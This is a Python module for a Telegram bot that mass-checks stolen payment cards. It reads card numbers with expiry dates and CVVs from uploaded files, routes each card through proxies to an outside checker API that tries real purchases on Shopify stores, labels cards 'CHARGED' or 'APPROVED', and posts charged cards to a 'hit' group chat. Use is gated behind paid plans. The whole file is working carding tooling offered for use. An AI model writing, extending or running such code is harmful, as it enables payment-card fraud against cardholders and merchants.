import re
import random
import asyncio
import logging
import aiohttp
from datetime import datetime
from typing import List, Dict
from database import get_user_credits, update_user_credits, get_user_proxies
from plans import get_user_current_tier

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

API_URL = "http://autosh.nikhilkhokhar.com/shopify"
SITE_URLS = ["https://naturallclub.com", "https://brittnetta.com", "https://brightland.co"]
HIT_GROUP_ID = -1003838614236

active_checks = {}
pending_checks = {}

def parse_card(card: str):
    card = card.strip()
    m = re.match(r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$', card)
    if m:
        cc, mm, yy, cvv = m.groups()
        mm = mm.zfill(2)
        if len(yy) == 4:
            yy = yy[2:]
        return f"{cc}|{mm}|{yy}|{cvv}"
    return None

async def check_single(card: str, proxy: str) -> Dict:
    try:
        proxy_clean = proxy.replace('http://', '')
        site = random.choice(SITE_URLS)
        url = f"{API_URL}?site={site}&cc={card}&proxy={proxy_clean}"
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=30) as r:
                if r.status != 200:
                    return None
                data = await r.json()
                resp = data.get("Response", "")
                if "order_paid" in resp.lower():
                    return {"card": card, "status": "CHARGED", "resp": resp}
                elif any(x in resp.lower() for x in ["3d", "insufficient", "invalid_cvc"]):
                    return {"card": card, "status": "APPROVED", "resp": resp}
                return None
    except:
        return None

async def handle_msh_command(update, context):
    user_id = update.effective_user.id
    user_tier = get_user_current_tier(user_id)
    
    if user_tier == "Free":
        await update.message.reply_text("⚠️ Mass check requires paid plan.")
        return
    
    if not update.message.document:
        await update.message.reply_text("Send a .txt file with cards (one per line)")
        return
    
    file = await context.bot.get_file(update.message.document.file_id)
    content = await file.download_as_bytearray()
    cards = [line.strip() for line in content.decode().split('\n') if line.strip() and '|' in line]
    cards = [c for c in cards if parse_card(c)]
    
    if not cards:
        await update.message.reply_text("No valid cards found")
        return
    
    proxies = get_user_proxies(user_id)
    if not proxies:
        await update.message.reply_text("No proxies found. Use /proxy to add.")
        return
    
    msg = await update.message.reply_text(f"Checking {len(cards)} cards...")
    
    results = {"charged": [], "approved": [], "total": len(cards)}
    
    for i, card in enumerate(cards):
        proxy = random.choice(proxies)
        res = await check_single(card, proxy)
        if res:
            if res['status'] == 'CHARGED':
                results['charged'].append(card)
            else:
                results['approved'].append(card)
        if (i + 1) % 10 == 0:
            await msg.edit_text(f"Progress: {i+1}/{len(cards)}\nCharged: {len(results['charged'])}\nApproved: {len(results['approved'])}")
        await asyncio.sleep(0.3)
    
    final = f"✅ Completed!\nTotal: {results['total']}\n🔥 Charged: {len(results['charged'])}\n✅ Approved: {len(results['approved'])}"
    await msg.edit_text(final)
    
    if results['charged']:
        async with aiohttp.ClientSession() as s:
            for ch in results['charged'][:5]:
                await s.post(f"https://api.telegram.org/bot{context.bot.token}/sendMessage",
                            json={"chat_id": HIT_GROUP_ID, "text": f"🔥 HIT: {ch}"})

async def handle_stop_command(update, context):
    await update.message.reply_text("Use /msh to start new check")
